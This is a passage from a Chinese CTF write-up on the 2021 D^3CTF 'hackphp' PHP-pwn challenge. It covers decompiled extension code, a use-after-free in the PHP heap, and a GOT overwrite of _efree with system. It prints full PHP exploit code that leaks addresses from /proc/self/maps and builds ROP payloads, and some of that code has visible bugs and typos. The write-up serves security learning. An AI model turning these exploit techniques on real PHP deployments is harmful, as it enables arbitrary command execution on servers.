    callback($buffer);
    $stack = hexdec($stack[1][0]);
    $libc_base = hexdec($libc[1][0]);
    $payload=str_repeat("a",0x88);
    $payload.=i2s($libc_base+0x215bf);
    $payload.=i2s($stack+0x1ca98+0x90).i2s($libc_base+0x23eea);
    $payload.=i2s($stack+0x1ca98+0x28).i2s($libc_base+0x80a10);
    $payload.="r".str_repeat("\x00",0x7).str_repeat("c",0x60);
    $payload.=$command.str_repeat("b",0x8);
    echo $payload;
    Minclude($payload)
    ?>
## 2021-D^3CTF-hackphp
###  漏洞分析
这道题就是一道纯的 `php-pwn`，并且涉及到了 php堆里的知识。
    void __fastcall zif_hackphp_create(zend_execute_data *execute_data, zval *return_value)
    {
      __int64 v2; // rdi
      __int64 size[3]; // [rsp+0h] [rbp-18h] BYREF
      v2 = execute_data->This.u2.next;
      size[1] = __readfsqword(0x28u);
      if ( (unsigned int)zend_parse_parameters(v2, &unk_2000, size) != -1 )
      {
        buf = (char *)_emalloc(size[0]);
        buf_size = size[0];
        if ( buf )
        {
          if ( (unsigned __int64)(size[0] - 0x100) u1.type_info = 3;
            return;
          }
          _efree();
        }
      }
      return_value->u1.type_info = 2;
    }
在 `zif_hack_php`函数中，当申请的堆块大小 0512时，程序会将申请的 堆块 buf 使用
_efree释放掉。但是却没有将 buf 堆块指针清空为0。所以这里存在一个 UAF漏洞。
      unsigned int v5; // eax
      __int64 v6; // rax
      size_t v7; // rdx
      int v8; // er8
      __int64 v9[5]; // [rsp+0h] [rbp-28h] BYREF
      v9[1] = __readfsqword(0x28u);
      v5 = *(_DWORD *)(a1 + 44);
      if ( v5 > 1 )
      {
        zend_wrong_parameters_count_error(0LL, 1LL);
      }
      else
      {
        if ( v5 )
        {
          if ( *(_BYTE *)(a1 + 88) == 6 )
          {
            v6 = *(_QWORD *)(a1 + 80);
          }
          else
          {
            v8 = zend_parse_arg_str_slow(a1 + 80, v9);
            v6 = v9[0];
            if ( !v8 )
            {
              zif_hackphp_edit_cold();
              return;
            }
          }
          a4 = *(_QWORD *)(v6 + 16);
          a5 = (const void *)(v6 + 24);
        }
        if ( buf && (v7 = buf_size) != 0 )
        {
          if ( buf_size > a4 )
            v7 = a4;
          memcpy(buf, a5, v7);
          *(_DWORD *)(a2 + 8) = 3;
        }
        else
        {
          *(_DWORD *)(a2 + 8) = 2;
        }
      }
    }
在 `zif_hackphp_edit`函数中，可以直接使用 `memcpy`对堆数据进行修改。
    void __fastcall zif_hackphp_delete(zend_execute_data *execute_data, zval *return_value)
    {
      if ( buf )
      {
        _efree();
        buf = 0LL;
        return_value->u1.type_info = 3;
        buf_size = 0LL;
      }
      else
      {
        return_value->u1.type_info = 2;
      }
    }
`zif_hackphp_delete`函数，可以使用 `_efree`释放堆指针。
还有就是 `hackphp.so`的保护机制如下，对 got表的保护为开启，可以直接修改 got表来getshell。
    checksec hackphp.so                          
    ] '/hackphp.so'     
      Arch:     amd64-64-little                  
      RELRO:    Partial RELRO                    
      Stack:    Canary found                     
      NX:       NX enabled                       
      PIE:      PIE enabled
###  利用分析
我们的初步思路，就是利用 UAF漏洞来修改 `_efree[@Got](https://github.com/Got
"@Got")`为`system`，然后在堆块里写入 /readflag，释放该堆块，即可执行 `system('/readflag')`。
####  PHP 堆机制
`PHP`的堆机制与
`ptmalloc`并不相似，`PHP`的内存分配是一次性向系统申请开辟的，`PHP`自身有个内存管理池，每次申请内存都会先在管理池中寻找合适的内存块，找不到才向系统申请内存。并且释放后的内存不交回给系统，而是放在内存管理池中继续使用。其管理机制，与
`Kernel`中的`slab/slub`分配器类似，分配的堆结构并没有堆头，而是与 内存桶对齐。
`PHP`的空闲堆块，有一个 `fd`指针指向下一个相同大小的堆块。并且，这里对该指针并没有做过多检查，我们可以理解为 `2.27下的
tcache`，可以直接使用 `tcache poisonin`g攻击，将`fd`指向任意地址，实现分配堆块到任意地址。
此外，还得讲一下后面会用到的`str_repea`t对象，该对象也会向`php`申请堆内存。当创建一个`str_repeat("a",0x30)`对象时，系统会返回
`0x50`的堆块空间，并且返回堆块偏移 `0x18`地址处 存储的是 字符串的大小，后面才是 字符内容。如下所示：
    pwndbg> x/20xg 0x00007ffff5871000                         
    0x7ffff5871000: 0x0000000600000001      0x0000000000000000
    0x7ffff5871010: 0x00000000000001f0      0x6161616161616161
    0x7ffff5871020: 0x6161616161616161      0x6161616161616161
    0x7ffff5871030: 0x6161616161616161      0x6161616161616161
    0x7ffff5871040: 0x6161616161616161      0x6161616161616161
    0x7ffff5871050: 0x6161616161616161      0x6161616161616161
    0x7ffff5871060: 0x6161616161616161      0x6161616161616161
    0x7ffff5871070: 0x6161616161616161      0x6161616161616161
    0x7ffff5871080: 0x6161616161616161      0x6161616161616161
    0x7ffff5871090: 0x6161616161616161      0x6161616161616161
####  UAF利用
这里，我们先申请一个 `0x210`的堆块，造成 `UAF`漏洞。随后，调用 `edit`函数，修改 `0x210`这个空闲堆块的
fd指向`buf-0x28`的地址。
随后我们创建两个 str_repeat对象，如下：
    str_repeat("a",0x1f0);
    str_repeat($efree_got, 0x1f0/8)
此时，我们即已经将 `buf`的值 修改为 `efree_got`地址。
解释一下原理。当我们完成`edit`后，此时 `0x210`的堆块空闲链表如下，`freed_chun`k为我们首先释放的 0x210堆块
    freed_chunk->buf-0x28
然后，创建第一个 str_repeat对象时，申请了 0x1f0的空间，系统实际会返回 0x210的空间。所以这里 freed_chunk被分配。
创建第二个 str_repear对象时，又申请了 0x1f0的空间，那么 buf-0x28的地址被返回，并且 buf-0x28+0x18处开始填充为
字符内容，也即 efree_got的地址。
那么自此，我们完成了 buf的劫持。
####  getshell
随后，我们使用 `edit`函数，将 `efree_got`修改为 `system`地址。
再调用`create`函数，申请一个 `0x100`的空间，`edit`其内容为 `/readflag`。再调用 delete函数，即可得到flag。
`EXP`如下：
    = 0;$i--) $hex.= dechex(ord($str[$i]));
        $hex = strtoupper($hex);
        return $hex;
    }
    function int2Str($i, $x = 8) {
        $re = "";
        for($j = 0;$j >= 8;
        }
        return $re;
    }
    function leakaddr($buffer){
        global $libc,$mbase;
        $p = '/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.31.so/';
        $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/lib\/php\/20170718\/hackphp.so/';
        preg_match_all($p, $buffer, $libc);
        preg_match_all($p1, $buffer, $mbase);
        return "";
    }
    ob_start("leakaddr");
    include("/proc/self/maps");
    $buffer = ob_get_contents();
    ob_end_flush();
    leakaddr($buffer);
    $libc_base=hexdec($libc[1][0]);
    $mod_base=hexdec($libc[1][0]);
    hackphp_create(0x210);
    $data=int2Str($base + 0x4178-0x28);
    hackphp_edit($data);
    $heap1=str_repeat("a",0x1f0);
    $heap1=str_repeat(int2Str($mod_base+0x4070),(0x1f0)/8);
    hackphp_edit(int2Str($libc_base+0x55410));
    hackphp_create(0x100);
    heackphp_edit("/readflag");
    hackphp_delete();
    ?>
###  参考
[WEBPWN入门级调试讲解](https://www.anquanke.com/post/id/204404)